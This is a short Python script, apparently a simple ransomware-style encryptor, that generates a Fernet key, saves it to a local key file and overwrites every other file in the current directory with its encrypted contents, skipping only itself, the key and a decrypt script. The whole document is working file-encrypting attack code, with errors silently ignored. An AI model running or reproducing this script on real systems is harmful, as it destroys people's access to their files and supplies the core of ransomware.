import os

from cryptography.fernet import Fernet

KEY = Fernet.generate_key()

with open('key_file.key', 'wb') as key_file:
    key_file.write(KEY)

fernet = Fernet(KEY)


def encrypt(file):
    try:

        with open(file, 'rb') as myFile:
            myFileData = myFile.read()

        encryptedMyFileData = fernet.encrypt(myFileData)

        with open(file, 'wb') as myFile:
            myFile.write(encryptedMyFileData)

    except Exception:
        return


for file in os.listdir():
    # if file == 'encrypt.py' or file == 'key_file.key' or file == 'decrypt.py':
    if file in ['encrypt.py', 'key_file.key', 'decrypt.py']:
        continue
    elif os.path.isfile(file):
        encrypt(file)
